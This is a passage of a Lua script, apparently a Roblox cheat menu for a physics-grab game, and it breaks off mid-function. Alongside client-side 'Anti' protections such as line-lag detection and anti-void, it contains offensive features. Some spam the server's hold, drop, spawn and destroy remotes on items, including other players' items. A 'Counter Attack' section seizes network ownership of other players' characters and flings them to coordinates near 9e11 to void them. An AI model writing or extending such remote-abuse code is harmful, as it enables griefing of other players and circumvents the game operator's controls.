								table.insert(timestamps, v25)
							end
						end

						v23.timestamps = timestamps
					end
				end
			end

			local function fn27()
				if connection4 then
					return
				end

				if not createLine then
					return
				end

				connection4 = createLine.OnClientEvent:Connect(function(arg, arg2, arg3)
					if not autoLineLag.enabled then
						return
					end

					if not arg or arg == lp3 then
						return
					end
					local v23 = fn24(arg)

					if arg3 then
						arg2 = arg3
					else
						arg2 = typeof(arg2) == "CFrame" and arg2
					end

					if not arg2 or not v23 then
						return
					end

					if fn25(v23, arg2) then
						local now2 = tick()
						autoLineLag.lastLineTime = now2

						if not autoLineLag.playerData[arg] then
							autoLineLag.playerData[arg] = { lastNotify = 0, timestamps = {}, lastLineTime = now2 }
						end

						local v24 = autoLineLag.playerData[arg]
						table.insert(v24.timestamps, now2)
						v24.lastLineTime = now2
						local n31 = now2 - n29
						local timestamps = {}

						for _, timestamp in ipairs(v24.timestamps) do
							if timestamp >= n31 then
								table.insert(timestamps, timestamp)
							end
						end

						v24.timestamps = timestamps

						if #v24.timestamps >= n28 then
							if n30 <= now2 - v24.lastNotify then
								v24.lastNotify = now2
								local displayName = arg.DisplayName or arg.Name

								if notify then
									notify("Line lag detected!", "[" .. displayName .. " | " .. arg.Name .. "] is spamming lines!", 5)
								end
							end
						end
					end
				end)

				thread6 = task.spawn(function()
					while autoLineLag.enabled do
						task.wait(0.05)
						fn26()
					end

					thread6 = nil
				end)
			end

			local function fn28()
				if connection4 then
					connection4:Disconnect()
					connection4 = nil
				end

				if thread6 then
					task.cancel(thread6)
					thread6 = nil
				end

				autoLineLag.playerData = {}
				autoLineLag.lastLineTime = 0
				fn23()
			end

			if ps then
				ps.PlayerRemoving:Connect(function(player)
					autoLineLag.playerData[player] = nil
				end)
			end

			antiFunctionsBlock3:CreateToggle({
				Name = "Anti [line-lag]",
				Default = false,
				Callback = function(enabled)
					autoLineLag.enabled = enabled

					if enabled then
						autoLineLag.playerData = {}
						autoLineLag.lastLineTime = 0
						fn27()
						fn22()
					else
						fn28()
					end
				end,
			})
		end

		do
			local antiFunctionsBlock3 = _G.AntiFunctionsBlock
			local lp3 = _G.LP or game:GetService("Players").LocalPlayer
			local Players = game:GetService("Players")
			local Workspace = game:GetService("Workspace")

			local notify = _G.Notify or function(...)
				print(...)
			end

			local playSound = _G.PlaySound or function()
			end

			local sounds = _G.Sounds or {}
			local flag14 = false
			local thread6 = nil
			local n28 = 0

			local tbl9 = {
				NinjaKatana = true,
				NinjaKunai = true,
				NinjaShuriken = true,
				ToolCleaver = true,
				ToolDiggingForkRusty = true,
				ToolPencil = true,
				ToolPickaxe = true,
			}

			local function fn19()
				local character = lp3.Character
				local humanoidRootPart = character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChildWhichIsA("BasePart"))
				humanoidRootPart = humanoidRootPart and humanoidRootPart.Position

				for _, player in pairs(Players:GetPlayers()) do
					if player ~= lp3 then
						local v23 = Workspace:FindFirstChild(player.Name .. "SpawnedInToys")

						if v23 then
							for _, child in pairs(v23:GetChildren()) do
								if tbl9[child.Name] then
									local stickyPart = child:FindFirstChild("StickyPart") or child:FindFirstChildWhichIsA("BasePart")

									if stickyPart then
										local position = stickyPart.Position
										local magnitude = humanoidRootPart and (position - humanoidRootPart).Magnitude

										if not (magnitude and magnitude <= 100) then
											local n29 = math.abs(position.X)
											local n30 = math.abs(position.Y)
											local n31 = math.abs(position.Z)

											if n30 > 5e11 or n29 > 5e11 or n31 > 5e11 then
												pcall(function()
													child:Destroy()
												end)

												if tick() - n28 >= 6 then
													n28 = tick()
													notify("Protection", "Blocked lag/breaks shurikens - from: " .. player.DisplayName, 3)
													playSound(sounds.Notify)
												end
											end
										end
									end
								end
							end
						end
					end
				end
			end

			local function fn20()
				if flag14 then
					return
				end
				flag14 = true

				if thread6 then
					task.cancel(thread6)
					thread6 = nil
				end

				thread6 = task.spawn(function()
					while flag14 do
						fn19()
						task.wait()
					end
				end)
			end

			local function fn21()
				flag14 = false

				if thread6 then
					task.cancel(thread6)
					thread6 = nil
				end
			end

			antiFunctionsBlock3:CreateToggle({
				Name = "Anti [Shuriken Lags | Breakes]",
				Default = false,
				Callback = function(arg)
					if arg then
						fn20()
					else
						fn21()
					end
				end,
			})
		end

		do
			local antiFunctionsBlock3 = _G.AntiFunctionsBlock
			local lp3 = _G.LP
			local Workspace = game:GetService("Workspace")
			local fallenPartsDestroyHeight = -10000
			local flag14 = false
			local connection4 = nil
			local connection5 = nil

			local function fn19()
				if flag14 then
					Workspace.FallenPartsDestroyHeight = (0/0)
				else
					Workspace.FallenPartsDestroyHeight = fallenPartsDestroyHeight
				end
			end

			local function fn20()
				if flag14 then
					return
				end
				flag14 = true
				fn19()

				if connection4 then
					connection4:Disconnect()
					connection4 = nil
				end

				connection4 = Workspace:GetPropertyChangedSignal("FallenPartsDestroyHeight"):Connect(function()
					if flag14 then
						fn19()
					end
				end)

				if connection5 then
					connection5:Disconnect()
				end

				connection5 = lp3.CharacterAdded:Connect(function()
					if flag14 then
						fn19()
					end
				end)
			end

			local function fn21()
				flag14 = false
				fn19()

				if connection4 then
					connection4:Disconnect()
					connection4 = nil
				end

				if connection5 then
					connection5:Disconnect()
					connection5 = nil
				end
			end

			antiFunctionsBlock3:CreateToggle({
				Name = "Anti Void",
				Default = false,
				Callback = function(arg)
					if arg then
						fn20()
					else
						fn21()
					end
				end,
			})
		end

		do
			local ws2 = _G.WS
			local flag14 = false
			local tbl9 = {}
			local tbl10 = {}

			local function fn19(arg)
				if not arg or not arg.Parent then
					return
				end

				for _, child in pairs(arg:GetChildren()) do
					if child:IsA("BasePart") and child.Name == "PlotBarrier" then
						child.CanCollide = false
					end
				end

				local connection4 = arg.ChildAdded:Connect(function(child)
					if child:IsA("BasePart") and child.Name == "PlotBarrier" then
						child.CanCollide = false
					end
				end)

				table.insert(tbl9, connection4)
			end

			local function fn20(arg)
				if not arg or not arg.Parent then
					return
				end
				local barrier = arg:FindFirstChild("Barrier")

				if barrier then
					fn19(barrier)
				end

				local connection4 = arg.ChildAdded:Connect(function(child)
					if child.Name == "Barrier" then
						fn19(child)
					end
				end)

				table.insert(tbl10, connection4)
			end

			local function fn21()
				if flag14 then
					return
				end
				flag14 = true

				for _, v23 in pairs(tbl9) do
					v23:Disconnect()
				end

				for _, v23 in pairs(tbl10) do
					v23:Disconnect()
				end

				table.clear(tbl9)
				table.clear(tbl10)
				local plots = ws2:FindFirstChild("Plots")

				if plots then
					for _, child in pairs(plots:GetChildren()) do
						fn20(child)
					end

					local connection4 = plots.ChildAdded:Connect(function(child)
						if child:IsA("Model") and child.Name:find("Plot") then
							fn20(child)
						end
					end)

					table.insert(tbl10, connection4)
				else
					local connection4 = ws2.ChildAdded:Connect(function(child)
						if child.Name == "Plots" then
							waitConn:Disconnect()

							for _, child2 in pairs(child:GetChildren()) do
								fn20(child2)
							end
						end
					end)

					table.insert(tbl10, connection4)
				end
			end

			local function fn22()
				flag14 = false

				for _, v23 in pairs(tbl9) do
					v23:Disconnect()
				end

				for _, v23 in pairs(tbl10) do
					v23:Disconnect()
				end

				table.clear(tbl9)
				table.clear(tbl10)
			end

			_G.AntiFunctionsBlock:CreateToggle({
				Name = "Anti Barrier [Off Collision]",
				Default = false,
				Callback = function(arg)
					if arg then
						fn21()
					else
						fn22()
					end
				end,
			})
		end

		do
			local lp3 = _G.LP
			local ws2 = _G.WS
			local flag14 = false
			local cFrame = nil
			local transparency = nil
			local size = nil
			local connection4 = nil

			local function fn19()
				local plots = ws2:FindFirstChild("Plots")
				if not plots then
					return nil
				end
				local plot1 = plots:FindFirstChild("Plot1")
				if not plot1 then
					return nil
				end
				local barrier = plot1:FindFirstChild("Barrier")
				if not barrier then
					return nil
				end
				return barrier:FindFirstChild("PlotBarrier")
			end

			local function fn20()
				local v23 = fn19()

				if v23 then
					cFrame = v23.CFrame
					transparency = v23.Transparency
					size = v23.Size
				end
			end

			local function fn21()
				local v23 = fn19()

				if v23 and cFrame then
					v23.CFrame = cFrame
					v23.Transparency = transparency or 0
					v23.Size = size or Vector3.one
				end
			end

			local function fn22(arg, arg2, arg3)
				local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end
				local v23 = fn19()
				if not v23 or not v23.Parent then
					return
				end
				fn20()
				v23.Transparency = 1
				v23.Size = Vector3.zero

				while arg3 and arg3.Value == true and v23 and v23.Parent and humanoidRootPart and humanoidRootPart.Parent do
					v23.CFrame = humanoidRootPart.CFrame
					v23.Size = Vector3.zero
					task.wait()
				end

				if arg3 and arg3.Parent then
					arg3.Value = false
				end

				fn21()
			end

			local function fn23(character)
				task.wait(0.3)
				if not flag14 then
					return
				end
				local humanoid = character:FindFirstChild("Humanoid")
				if not humanoid then
					return
				end
				local connection5 = nil

				connection5 = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
					if not flag14 then
						connection5:Disconnect()
						return
					end
					local fireDebounce = humanoid:FindFirstChild("FireDebounce")

					if fireDebounce and fireDebounce.Value == true then
						task.spawn(fn22, character, humanoid, fireDebounce)
					end
				end)
			end

			local function fn24()
				flag14 = true

				if lp3.Character then
					fn23(lp3.Character)
				end

				connection4 = lp3.CharacterAdded:Connect(fn23)
			end

			local function fn25()
				flag14 = false

				if connection4 then
					connection4:Disconnect()
					connection4 = nil
				end

				fn21()
			end

			_G.AntiFunctionsBlock:CreateToggle({
				Name = "Anti Burn",
				Default = false,
				Callback = function(arg)
					if arg then
						fn24()
					else
						fn25()
					end
				end,
			})
		end
	end

	do
		local targetTab, ps, lp, notify, blackHoleDetector, ws, rs, cf, v32, currentCamera
		local UserInputService, selected, tbl5, v16, v17, flag7, connection, part2, flag8, connection2
		local fn12, fn13

		do
			do
				local lp2 = _G.LP
				local ws2 = _G.WS
				local flag9 = false
				local tbl6 = {}

				local function fn14(arg)
					return arg:IsA("BasePart") and arg.Name == "PaintPlayerPart"
				end

				local function fn15(arg)
					if arg and arg.Parent then
						arg:Destroy()
					end
				end

				local fn16 = nil

				fn16 = function(arg)
					for _, child in pairs(arg:GetChildren()) do
						if fn14(child) then
							fn15(child)
						elseif child:IsA("Folder") then
							fn16(child)
						end
					end
				end

				local fn17 = nil

				fn17 = function(arg)
					local connection3 = arg.ChildAdded:Connect(function(child)
						if fn14(child) then
							task.defer(function()
								if child and child.Parent then
									fn15(child)
								end
							end)
						elseif child:IsA("Folder") then
							fn17(child)
							fn16(child)
						end
					end)

					table.insert(tbl6, connection3)
				end

				local function fn18(arg, canTouch)
					if not arg then
						return
					end

					for _, child in pairs(arg:GetChildren()) do
						if child:IsA("BasePart") then
							child.CanTouch = canTouch
							child.CanQuery = canTouch
						end
					end
				end

				local function fn19()
					for _, v18 in pairs(tbl6) do
						pcall(function()
							v18:Disconnect()
						end)
					end

					tbl6 = {}
				end

				local function fn20()
					if flag9 then
						return
					end
					flag9 = true
					fn16(ws2)
					fn17(ws2)

					for _, child in pairs(ws2:GetChildren()) do
						if child:IsA("Folder") then
							fn17(child)
						end
					end

					if lp2.Character then
						fn18(lp2.Character, false)
					end

					local connection3 = lp2.CharacterAdded:Connect(function(character)
						task.wait(0.5)

						if flag9 then
							fn18(character, false)
						end
					end)

					table.insert(tbl6, connection3)
				end

				local function fn21()
					if not flag9 then
						return
					end
					flag9 = false
					fn19()

					if lp2.Character then
						fn18(lp2.Character, true)
					end
				end

				_G.AntiFunctionsBlock:CreateToggle({
					Name = "Anti Paint",
					Default = false,
					Callback = function(arg)
						if arg then
							fn20()
						else
							fn21()
						end
					end,
				})
			end

			local antiFunctionsBlock
			antiFunctionsBlock = _G.AntiFunctionsBlock
			local lp2

			do
				local states = _G.States
				lp2 = _G.LP
				local ps2 = _G.PS
				local ws2 = _G.WS
				local repS = _G.RepS
				local cf2 = _G.CF
				local v33 = _G.V3
				local destroyRemote = _G.DestroyRemote
				local notify2 = _G.Notify

				states.AntiInput = states.AntiInput or {
					enabled = false,
					loopThread = nil,
					watchThread = nil,
					selectedItem = "FoodBread",
					holdTime = 0.3,
					spawnCooldown = 0.5,
					theftInterval = 0.15,
					notifyCooldown = 3,
				}

				local antiInput = states.AntiInput

				local tbl6 = {
					InstrumentDrumBongos = "InstrumentDrumBongos",
					InstrumentBrassTrumpet = "InstrumentBrassTrumpet",
					InstrumentBrassBugle = "InstrumentBrassBugle",
					InstrumentVoiceMicrophone = "InstrumentVoiceMicrophone",
					InstrumentWoodwindOcarina = "InstrumentWoodwindOcarina",
					InstrumentGuitarUkulele = "InstrumentGuitarUkulele",
					InstrumentGuitarLyre = "InstrumentGuitarLyre",
					InstrumentGuitarBanjo = "InstrumentGuitarBanjo",
					InstrumentGuitarAcoustic = "InstrumentGuitarAcoustic",
					CupMugBrown = "CupMugBrown",
					CupMugWhite = "CupMugWhite",
					FoodBanana = "FoodBanana",
					FoodBread = "FoodBread",
					FoodBroccoli = "FoodBroccoli",
					FoodCakePink = "FoodCakePink",
					FoodCoconut = "FoodCoconut",
					FoodDippyEgg = "FoodDippyEgg",
					FoodDonut = "FoodDonut",
					FoodFrenchFries = "FoodFrenchFries",
					FoodHotdog = "FoodHotdog",
					FoodMayonnaise = "FoodMayonnaise",
					FoodMeatStick = "FoodMeatStick",
					FoodMushroomPoison = "FoodMushroomPoison",
					FoodPizzaCheese = "FoodPizzaCheese",
					FoodPizzaPepperoni = "FoodPizzaPepperoni",
					FoodSodaCan = "FoodSodaCan",
					FoodHamburger = "FoodHamburger",
					PoopPile = "PoopPile",
					PoopPileSparkle = "PoopPileSparkle",
				}

				local tbl7 = {}

				for k in pairs(tbl6) do
					table.insert(tbl7, k)
				end

				table.sort(tbl7)
				local connection3 = nil

				local function fn14()
					local grabEvents = repS:FindFirstChild("GrabEvents")

					if grabEvents then
						local endGrabEarly = grabEvents:FindFirstChild("EndGrabEarly")

						if endGrabEarly and endGrabEarly:IsA("RemoteEvent") then
							if connection3 then
								connection3:Disconnect()
							end

							connection3 = endGrabEarly.OnClientEvent:Connect(function()
							end)
						end
					end
				end

				local function fn15()
					if connection3 then
						connection3:Disconnect()
						connection3 = nil
					end
				end

				local function fn16()
					return ws2:FindFirstChild(lp2.Name .. "SpawnedInToys")
				end

				local function fn17(arg)
					if not arg then
						return
					end

					for _, descendant in pairs(arg:GetDescendants()) do
						if descendant:IsA("BasePart") then
							pcall(function()
								descendant.CanCollide = false
								descendant.CanQuery = false
							end)
						end
					end
				end

				local function fn18(arg)
					pcall(function()
						if destroyRemote then
							destroyRemote:FireServer(arg)
						end
					end)
				end

				local function fn19()
					local v18 = fn16()
					if not v18 then
						return
					end

					for _, child in pairs(v18:GetChildren()) do
						if tbl6[child.Name] then
							fn18(child)
						end
					end
				end

				local function fn20()
					local v18 = fn16()
					if not v18 then
						return
					end

					for _, child in pairs(v18:GetChildren()) do
						if tbl6[child.Name] and child.Name ~= antiInput.selectedItem then
							fn18(child)
						end
					end
				end

				local function fn21(arg, arg2)
					for _, player in ipairs(ps2:GetPlayers()) do
						if player ~= lp2 then
							local character = player.Character
							character = character and character:FindFirstChild("HumanoidRootPart")

							if character then
								if (character.Position - arg).Magnitude < arg2 then
									return player
								end
							end
						end
					end

					return nil
				end

				local n25 = 0

				local function fn22(arg, arg2)
					local now2 = tick()
					if now2 - n25 < antiInput.notifyCooldown then
						return
					end
					n25 = now2
					notify2("Anti-Input Theft!", arg.DisplayName .. " stole your " .. (tbl6[arg2] or arg2) .. "!", 4)
				end

				local function fn23()
					if antiInput.watchThread then
						task.cancel(antiInput.watchThread)
						antiInput.watchThread = nil
					end

					antiInput.watchThread = task.spawn(function()
						local v18 = nil
						local holdPart = nil

						while antiInput.enabled do
							task.wait(antiInput.theftInterval)
							local v19 = fn16()
							v19 = v19 and v19:FindFirstChild(antiInput.selectedItem)

							if not v19 then
								v18 = nil
								holdPart = nil
							else
								local v20

								if v19 == v18 then
									v20 = holdPart
								else
									v20 = nil
									v18 = v19
								end

								holdPart = v19:FindFirstChild("HoldPart")
								holdPart = holdPart and holdPart.Position or v19:GetPivot().Position

								if v20 then
									if (holdPart - v20).Magnitude > 0 then
										local v21 = fn21(holdPart, 6)

										if v21 then
											fn22(v21, v19.Name)
											fn18(v19)
											v18 = nil
											holdPart = nil
										end
									end
								else
									local v21 = fn21(holdPart, 3)

									if v21 then
										fn22(v21, v19.Name)
										fn18(v19)
										v18 = nil
										holdPart = nil
									end
								end
							end
						end
					end)
				end

				local function fn24()
					if antiInput.loopThread then
						task.cancel(antiInput.loopThread)
						antiInput.loopThread = nil
					end

					if antiInput.watchThread then
						task.cancel(antiInput.watchThread)
						antiInput.watchThread = nil
					end

					fn19()
				end

				local function fn25()
					fn24()
					fn20()
					fn23()

					antiInput.loopThread = task.spawn(function()
						local v18 = fn16()
						local v19 = nil
						local n26 = 0

						while antiInput.enabled do
							task.wait()
							local character = lp2.Character
							local humanoid = character and character:FindFirstChild("Humanoid")
							local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

							if not character or not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
								v19 = nil
							else
								if not v18 or not v18.Parent then
									v18 = fn16()
								end

								if not v18 then
									v19 = nil
								else
									local v20 = v18:FindFirstChild(antiInput.selectedItem)

									if not v20 then
										local now2 = tick()

										if antiInput.spawnCooldown <= now2 - n26 then
											task.spawn(function()
												pcall(function()
													repS.MenuToys.SpawnToyRemoteFunction:InvokeServer(antiInput.selectedItem, humanoidRootPart.CFrame * cf2(0, 100, 20), v33(0, 0, 0))
												end)
											end)

											n26 = now2
										end

										task.wait(0.1)
										v19 = nil
									else
										if v20 ~= v19 then
											fn17(v20)
											v19 = v20
										end

										local holdPart = v20:FindFirstChild("HoldPart")

										if holdPart then
											local holdItemRemoteFunction = holdPart:FindFirstChild("HoldItemRemoteFunction")
											local dropItemRemoteFunction = holdPart:FindFirstChild("DropItemRemoteFunction")

											if not (not holdItemRemoteFunction or not dropItemRemoteFunction) then
												task.spawn(function()
													pcall(function()
														holdItemRemoteFunction:InvokeServer(v20, character)
													end)
												end)

												task.wait(antiInput.holdTime)

												task.spawn(function()
													pcall(function()
														dropItemRemoteFunction:InvokeServer(v20, humanoidRootPart.CFrame * cf2(0, 1000, 0), v33(0, 0, 0))
													end)
												end)

												task.wait()
											end
										end
									end
								end
							end
						end
					end)
				end

				antiFunctionsBlock:CreateDropdown({
					Name = "Select [Item]",
					Items = tbl7,
					Default = "FoodBread",
					Callback = function(arg)
						antiInput.selectedItem = tbl6[arg]

						if antiInput.enabled then
							fn25()
						end
					end,
				})

				antiFunctionsBlock:CreateSlider({
					Name = "Hold Time [ms]",
					Min = 0.035,
					Max = 0.5,
					Default = 0.3,
					Callback = function(holdTime)
						antiInput.holdTime = holdTime
					end,
				})

				antiFunctionsBlock:CreateToggle({
					Name = "Anti Input lag [Item]",
					Default = false,
					Callback = function(enabled)
						antiInput.enabled = enabled
						n25 = 0

						if enabled then
							fn14()
							fn25()
						else
							fn15()
							fn24()
						end
					end,
				})
			end

			do
				local antiFunctionsBlock2 = _G.AntiFunctionsBlock
				local states = _G.States
				local lp3 = _G.LP
				local ws2 = _G.WS
				local v18 = pcall
				states.AntiAntiInput = states.AntiAntiInput or { enabled = false, connections = {}, spamThreads = {}, spamActive = {} }
				local antiAntiInput = states.AntiAntiInput

				local tbl6 = {
					InstrumentDrumBongos = true,
					InstrumentBrassTrumpet = true,
					InstrumentBrassBugle = true,
					InstrumentVoiceMicrophone = true,
					InstrumentWoodwindOcarina = true,
					InstrumentGuitarUkulele = true,
					InstrumentGuitarLyre = true,
					InstrumentGuitarBanjo = true,
					InstrumentGuitarAcoustic = true,
					CupMugBrown = true,
					CupMugWhite = true,
					FoodBanana = true,
					FoodBread = true,
					FoodBroccoli = true,
					FoodCakePink = true,
					FoodCoconut = true,
					FoodDippyEgg = true,
					FoodDonut = true,
					FoodFrenchFries = true,
					FoodHotdog = true,
					FoodMayonnaise = true,
					FoodMeatStick = true,
					FoodMushroomPoison = true,
					FoodPizzaCheese = true,
					FoodPizzaPepperoni = true,
					FoodSodaCan = true,
					FoodHamburger = true,
					PoopPile = true,
					PoopPileSparkle = true,
				}

				local function fn14(arg)
					if not antiAntiInput.enabled or not arg or antiAntiInput.spamActive[arg] then
						return
					end
					local parent = arg.Parent

					if parent then
						parent = parent.Name == lp3.Name .. "SpawnedInToys" or parent:IsA("Player") or parent:IsA("Backpack")
					end

					if parent then
						return
					end
					local character = lp3.Character
					if not character then
						return
					end
					local holdPart = arg:FindFirstChild("HoldPart") or arg:WaitForChild("HoldPart", 2)
					if not holdPart then
						return
					end
					local holdItemRemoteFunction = holdPart:FindFirstChild("HoldItemRemoteFunction") or holdPart:WaitForChild("HoldItemRemoteFunction", 2)
					local dropItemRemoteFunction = holdPart:FindFirstChild("DropItemRemoteFunction")
					if not holdItemRemoteFunction then
						return
					end
					antiAntiInput.spamActive[arg] = true

					local thread = task.spawn(function()
						while antiAntiInput.enabled and antiAntiInput.spamActive[arg] and arg.Parent do
							v18(function()
								holdItemRemoteFunction:InvokeServer(arg, character)
							end)

							task.wait()
						end
					end)

					table.insert(antiAntiInput.spamThreads, thread)

					if dropItemRemoteFunction then
						local thread2 = task.spawn(function()
							while antiAntiInput.enabled and antiAntiInput.spamActive[arg] and arg.Parent do
								v18(function()
									dropItemRemoteFunction:InvokeServer(arg, Vector3.new(0, 10000000, 0))
								end)

								task.wait()
							end
						end)

						table.insert(antiAntiInput.spamThreads, thread2)
					end
				end

				local function fn15()
					local n25 = #antiAntiInput.spamThreads

					while n25 >= 1 do
						local v19 = antiAntiInput.spamThreads[n25]

						if not v19 or coroutine.status(v19) == "dead" then
							table.remove(antiAntiInput.spamThreads, n25)
						end

						n25 -= 1
					end

					for k in pairs(antiAntiInput.spamActive) do
						if not k or not k.Parent then
							antiAntiInput.spamActive[k] = nil
						end
					end
				end

				task.spawn(function()
					while true do
						task.wait(10)
						fn15()
					end
				end)

				antiFunctionsBlock2:CreateToggle({
					Name = "Anti [Anti-Input]",
					Default = false,
					Callback = function(arg)
						if arg then
							antiAntiInput.enabled = true
							antiAntiInput.spamActive = {}

							local connection3 = ws2.DescendantAdded:Connect(function(descendant)
								if not antiAntiInput.enabled then
									return
								end

								if tbl6[descendant.Name] then
									task.spawn(fn14, descendant)
								end
							end)

							table.insert(antiAntiInput.connections, connection3)

							task.spawn(function()
								local tbl7 = { ws2 }

								while #tbl7 > 0 and antiAntiInput.enabled do
									local children = table.remove(tbl7):GetChildren()

									for _, child in ipairs(children) do
										if antiAntiInput.enabled then
											if tbl6[child.Name] then
												task.spawn(fn14, child)
											elseif not child:IsA("BasePart") and child.Name ~= "Terrain" then
												table.insert(tbl7, child)
											end

											continue
										end

										break
									end

									if #children > 20 then
										task.wait()
									end
								end
							end)
						else
							antiAntiInput.enabled = false

							for _, connection3 in ipairs(antiAntiInput.connections) do
								v18(function()
									connection3:Disconnect()
								end)
							end

							for _, spamThread in ipairs(antiAntiInput.spamThreads) do
								v18(function()
									task.cancel(spamThread)
								end)
							end

							antiAntiInput.connections = {}
							antiAntiInput.spamThreads = {}
							antiAntiInput.spamActive = {}
						end
					end,
				})
			end

			do
				local lp3 = _G.LP
				local flag9 = false

				local function fn14(disabled)
					flag9 = disabled

					if lp3 and lp3.PlayerScripts then
						local stickyPartsTouchDetection = lp3.PlayerScripts:FindFirstChild("StickyPartsTouchDetection")

						if stickyPartsTouchDetection then
							stickyPartsTouchDetection.Disabled = disabled
						end
					end
				end

				_G.AntiFunctionsBlock:CreateToggle({
					Name = "Anti Sticky [self]",
					Default = false,
					Callback = function(arg)
						fn14(arg)
					end,
				})
			end

			do
				local v18 = _G.ProtectionTab:CreateBlock({ Name = "Counter Attack Method", Side = "Right", ImageID = "126813390527582" })
				_G.CounterAttackBlock = v18
				local str5 = "Ownership"
				local flag9 = false
				local thread = nil

				v18:CreateDropdown({
					Name = "Select Method",
					Items = { "Ownership", "Void", "Ragdoll" },
					Default = "Ownership",
					Callback = function(arg)
						str5 = arg
					end,
				})

				v18:CreateToggle({
					Name = "Enable Method",
					Default = false,
					Callback = function(arg)
						if arg then
							if str5 == "Ownership" then
								flag9 = true

								local function fn14(arg2)
									if not arg2 then
										return nil
									end
									local partOwner = arg2:FindFirstChild("PartOwner")
									if partOwner and partOwner.Value and partOwner.Value ~= "" and partOwner.Value ~= _G.LP.Name then
										return partOwner.Value
									end
									return nil
								end

								local function fn15(arg2)
									return _G.PS:FindFirstChild(arg2)
								end

								local function fn16(arg2)
									if not flag9 then
										return
									end
									local v19 = fn15(arg2)
									if not v19 or not v19.Character then
										return
									end

									task.spawn(function()
										local character = v19.Character
										if not character then
											return
										end
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
										if not humanoidRootPart then
											return
										end

										if _G.SNO then
											_G.SNO:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
										end
									end)
								end

								thread = task.spawn(function()
									while flag9 do
										local character = _G.LP.Character

										if character then
											local tbl6 = {}
											local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
											local head = character:FindFirstChild("Head")
											local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
											local leftArm = character:FindFirstChild("Left Arm")
											local rightArm = character:FindFirstChild("Right Arm")
											local leftLeg = character:FindFirstChild("Left Leg")
											local v19 = table.pack(character:FindFirstChild("Right Leg"))
											tbl6[1] = humanoidRootPart
											tbl6[2] = head
											tbl6[3] = torso
											tbl6[4] = leftArm
											tbl6[5] = rightArm
											tbl6[6] = leftLeg

											do
												local values = table.pack(table.unpack(v19, 1, v19.n))
												table.move(values, 1, values.n, 7, tbl6)
											end

											for _, v20 in ipairs(tbl6) do
												if v20 then
													local v21 = fn14(v20)

													if v21 then
														fn16(v21)
													end
												end
											end

											local isHeld = _G.LP:FindFirstChild("IsHeld")

											if isHeld and isHeld.Value == true then
												local grabParts = _G.WS:FindFirstChild("GrabParts")

												if grabParts then
													local grabPart = grabParts:FindFirstChild("GrabPart")

													if grabPart then
														local partOwner = grabPart:FindFirstChild("PartOwner")

														if partOwner and partOwner.Value and partOwner.Value ~= "" and partOwner.Value ~= _G.LP.Name then
															fn16(partOwner.Value)
														end
													end
												end
											end
										end

										task.wait()
									end
								end)
							elseif str5 == "Void" then
								flag9 = true

								local function fn14(arg2)
									if not arg2 then
										return nil
									end
									local partOwner = arg2:FindFirstChild("PartOwner")
									if partOwner and partOwner.Value and partOwner.Value ~= "" and partOwner.Value ~= _G.LP.Name then
										return partOwner.Value
									end
									return nil
								end

								local function fn15(arg2)
									if not flag9 then
										return
									end
									local v19 = _G.PS:FindFirstChild(arg2)
									if not v19 or not v19.Character then
										return
									end

									task.spawn(function()
										local character = v19.Character
										if not character then
											return
										end
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
										if not humanoidRootPart then
											return
										end

										if _G.SNO then
											_G.SNO:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
										end

										local bodyPosition = Instance.new("BodyPosition")
										bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
										bodyPosition.P = 100000
										bodyPosition.Position = Vector3.new(9e11, 9e11, 9e9)
										bodyPosition.Parent = humanoidRootPart
										humanoidRootPart.CFrame = CFrame.new(Vector3.new(9e11, 9e11, 9e9))
										humanoidRootPart.Velocity = Vector3.zero
										humanoidRootPart.AssemblyLinearVelocity = Vector3.zero

										for _, v20 in ipairs({ "Head", "Torso", "UpperTorso", "LowerTorso", "Left Arm", "Right Arm", "Left Leg", "Right Leg" }) do
											local v21 = character:FindFirstChild(v20)

											if v21 then
												v21.CFrame = CFrame.new(Vector3.new(9e11, 9e11, 9e9))
												v21.Velocity = Vector3.zero
												v21.AssemblyLinearVelocity = Vector3.zero
											end
										end

										task.delay(0.5, function()
											if bodyPosition and bodyPosition.Parent then
												bodyPosition:Destroy()
											end
										end)
									end)
								end

								thread = task.spawn(function()
									while flag9 do
										local character = _G.LP.Character

										if character then
											local tbl6 = {}
											local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
											local head = character:FindFirstChild("Head")
											local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
											local leftArm = character:FindFirstChild("Left Arm")
											local rightArm = character:FindFirstChild("Right Arm")
											local leftLeg = character:FindFirstChild("Left Leg")
											local v19 = table.pack(character:FindFirstChild("Right Leg"))
											tbl6[1] = humanoidRootPart
											tbl6[2] = head
											tbl6[3] = torso
											tbl6[4] = leftArm
											tbl6[5] = rightArm
											tbl6[6] = leftLeg

											do
												local values = table.pack(table.unpack(v19, 1, v19.n))
												table.move(values, 1, values.n, 7, tbl6)
											end

											for _, v20 in ipairs(tbl6) do
												if v20 then
													local v21 = fn14(v20)

													if v21 then
														fn15(v21)
													end
												end
											end

											local isHeld = _G.LP:FindFirstChild("IsHeld")

											if isHeld and isHeld.Value == true then
												local grabParts = _G.WS:FindFirstChild("GrabParts")

												if grabParts then
													local grabPart = grabParts:FindFirstChild("GrabPart")

													if grabPart then
														local partOwner = grabPart:FindFirstChild("PartOwner")

														if partOwner and partOwner.Value and partOwner.Value ~= "" and partOwner.Value ~= _G.LP.Name then
															fn15(partOwner.Value)
														end
													end
												end
											end
										end

										task.wait()
									end
								end)
							elseif str5 == "Ragdoll" then
								if not _G.PermanentPallet or not _G.PermanentPallet.enabled or not _G.PermanentPallet.currentPallet then
									_G.Notify("Ragdoll Method", "PERMANENT PALLET NEEDED - ENABLE IT FIRST", 5)
									return
								end
								flag9 = true
								local currentPallet = _G.PermanentPallet.currentPallet
								local soundPart = currentPallet and currentPallet:FindFirstChild("SoundPart")
								if not soundPart then
									_G.Notify("Ragdoll Method", "PALLET HAS NO SOUNDPART", 3)
									return
								end

								local function fn14(arg2)
									if not arg2 then
										return nil
									end
